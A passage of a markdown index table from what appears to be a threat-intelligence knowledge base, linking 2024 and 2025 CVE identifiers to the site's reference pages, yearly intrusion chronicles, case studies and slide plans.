| [CVE-2024-4040](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-4040) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-4577](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-4577) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-7593](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-7593) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-8190](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8190) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2024-8956](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8956) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-8957](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8957) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-8963](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8963) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2024-9379](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-9379) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2024-9380](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-9380) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2024-9474](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-9474) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-12356](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-12356) | [The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Case Studies](/case-studies/README.md), [Slide plan: The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/slides/plans/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md) |
| [CVE-2024-12686](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-12686) | [The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md) |
| [CVE-2024-20353](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-20353) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-20359](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-20359) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-21182](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21182) | [Oracle PeopleSoft CVE-2026-35273 and the ShinyHunters Mass Exploitation of 2026: A Case Study](/case-studies/ORACLE_PEOPLESOFT_SHINYHUNTERS_2026.md) |
| [CVE-2024-21412](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21412) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-21762](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21762) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-21887](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21887) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2024-21893](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21893) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md) |
| [CVE-2024-23113](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-23113) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-24919](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-24919) | [Vulnerability Prioritization Reference (SSVC, KEV, EPSS)](/VULNERABILITY_PRIORITIZATION_REFERENCE.md), [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/slides/plans/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2024-27198](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-27198) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-27199](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-27199) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-27443](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-27443) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-29988](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-29988) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-34102](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-34102) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md) |
| [CVE-2024-36401](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-36401) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2024-37085](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-37085) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2024-37383](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-37383) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38014](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38014) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38112](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38112) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38178](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38178) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38193](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38193) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-38213](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38213) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38217](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38217) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-38812](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38812) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2024-39717](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-39717) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md) |
| [CVE-2024-40711](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-40711) | [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md) |
| [CVE-2024-40766](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-40766) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2024-43461](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-43461) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-43572](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-43572) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2024-47575](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-47575) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md) |
| [CVE-2024-50623](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-50623) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md) |
| [CVE-2024-54085](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-54085) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-55591](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-55591) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2024-55956](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-55956) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2024 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2024.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md), [Slide plan: The Year 2024 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2024.md) |
| [CVE-2024-57726](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-57726) | [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2024-57727](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-57727) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/slides/plans/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2024-57728](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-57728) | [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2025-0282](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-0282) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md) |
| [CVE-2025-0411](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-0411) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-0994](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-0994) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-1316](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-1316) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-2783](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-2783) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-3248](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-3248) | [Langflow](/ai-tooling/tools/LANGFLOW.md), [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md) |
| [CVE-2025-3928](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-3928) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-3935](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-3935) | [The ConnectWise Cloud Backup Compromise of October 2026: A Case Study](/case-studies/CONNECTWISE_STORM_0940_2026.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2025-4427](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-4427) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2025-4428](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-4428) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2025-5777](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-5777) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [NetScaler ADC and Gateway](/operating-systems/netscaler.md) |
| [CVE-2025-6218](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-6218) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-6543](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-6543) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md), [NetScaler ADC and Gateway](/operating-systems/netscaler.md) |
| [CVE-2025-7775](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-7775) | [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2025-8088](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-8088) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-8875](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-8875) | [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2025-8876](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-8876) | [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2025-10035](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-10035) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-14847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-14847) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-15556](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-15556) | [The Notepad++ Update-Channel Hijack (CVE-2025-15556): A Case Study](/case-studies/NOTEPAD_PLUS_PLUS_UPDATE_HIJACK_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Notepad++ Update-Channel Hijack (CVE-2025-15556): A Case Study](/case-studies/slides/plans/NOTEPAD_PLUS_PLUS_UPDATE_HIJACK_2026.md) |
| [CVE-2025-20333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20333) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-20352](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20352) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-20362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20362) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-20393](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20393) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-21043](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-21043) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-21333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-21333) | [Starred Repositories Index](/STARRED_REPOS.md) |
| [CVE-2025-21590](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-21590) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md) |
| [CVE-2025-22224](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22224) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md), [VMware ESXi](/operating-systems/vmware-esxi.md) |
| [CVE-2025-22225](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22225) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2025-22226](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22226) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2025-22457](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22457) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md) |
| [CVE-2025-24054](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-24054) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-24472](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-24472) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2025-24813](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-24813) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-26633](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-26633) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-27363](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-27363) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-27920](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-27920) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: Other State-Linked Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2025-29824](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-29824) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-30066](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-30066) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-30154](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-30154) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-30397](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-30397) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-31161](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-31161) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-31200](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-31200) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
